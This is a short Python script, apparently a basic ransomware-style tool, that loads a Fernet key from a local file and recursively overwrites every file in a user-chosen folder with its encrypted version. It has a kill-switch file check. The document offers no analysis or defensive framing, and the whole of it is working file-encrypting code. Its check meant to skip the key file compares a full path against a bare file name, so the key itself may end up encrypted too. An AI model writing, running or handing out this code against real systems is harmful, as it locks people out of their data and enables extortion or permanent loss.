import os
import sys
from cryptography.fernet import Fernet

if os.path.exists("killswitch.txt"):
    print("[!] Kill switch detected. Program halted.")
    sys.exit()

def load_key():
    return open("secret.key", "rb").read()

def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted = f.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted)

def encrypt_folder(folder_path, key):
    for root, _, files in os.walk(folder_path):
        for file in files:
            path = os.path.join(root, file)
            if path == "secret.key":
                continue
            encrypt_file(path, key)
            print(f"[+] Encrypted: {path}")

if __name__ == "__main__":
    folder = input("Enter folder path to encrypt: ")
    key = load_key()
    encrypt_folder(folder, key)
